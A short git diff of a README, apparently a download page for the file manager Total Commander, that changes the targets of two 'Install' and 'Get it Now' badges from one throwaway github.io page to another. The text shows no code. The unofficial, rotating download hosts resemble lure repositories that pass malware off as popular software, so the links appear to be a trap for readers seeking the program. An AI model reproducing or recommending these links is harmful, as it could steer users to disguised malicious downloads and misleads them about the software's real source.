@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://gunbpx.github.io/.github/totalCommander)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://maopolo-sot.github.io/.github/totalCommander)
 
 </div>
 
@@ -81,7 +81,7 @@ The dual-pane paradigm's efficiency advantage over single-window file management
 
 <p align="center">
 
-[![Get it Now Total Commander](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://gunbpx.github.io/.github/totalCommander)
+[![Get it Now Total Commander](https://img.shields.io/badge/Get_it_Now-023E8A?style=for-the-badge&logo=apple&logoColor=white)](https://maopolo-sot.github.io/.github/totalCommander)
 
 </p>
 
